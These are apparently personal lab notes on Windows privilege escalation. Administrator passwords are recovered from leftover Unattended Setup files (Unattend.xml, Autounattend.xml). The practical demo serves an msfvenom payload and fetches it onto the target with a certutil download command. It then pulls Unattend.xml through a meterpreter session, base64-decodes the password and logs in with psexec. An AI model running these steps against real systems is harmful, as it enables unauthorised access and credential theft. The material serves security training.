# Searching For Passwords In Windows Configuration Files

* Windows can automate a variety of repetitive tasks, such as the mass rollout or installation of Windows on many systems.
* This is typically done through the use of the Unattendeed Windows Setup utility, which is used to automate the mass installation/deployment of Windows on systems.
* This tool utilizes configuration files that contain specificconfigurations and user account credentials, specifically the Administrator account's password.
* If the Unattended Windows Setup configuration files are left on the target system after instalation, they can reveal user accout credentials that can be used by attacker to authenticate with Windows target legitimately.

## Unattended Windows Setup

* The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
  * <mark style="color:red;">C:\Windows\Panther\Unattend.xml</mark>
  * <mark style="color:red;">C:\Windows\Panther\Autounattend.xml</mark>
* As a security precaution, the password stored in the Unattended Windows Setup configuration file may be encoded in base64.

## Practical Demo

In this case we generated a payload with msfvenom...used python simple server to share it thorugh a webserver. And downloaded it through the GUI interface given to us by the lab.

#### Download file from apache server:

* <mark style="color:yellow;">certutil -urlcache -f http://targetIP/nameofpayload</mark>

Started a multi/handler in attacker machine with the same configs as the msfvenom payload.

After gaining meterpreter session on target, download <mark style="color:red;">Unattend.xml</mark>

* <mark style="color:yellow;">download Unattend.xml</mark>

Search for the <mark style="color:red;">AutoLogon</mark> line and the value of <mark style="color:red;">password</mark>.

If it comes in base64 decode it with:

* <mark style="color:yellow;">base64 -d password.txt</mark>

Use <mark style="color:red;">psexec python script</mark> to attempt login with obtained credentials.
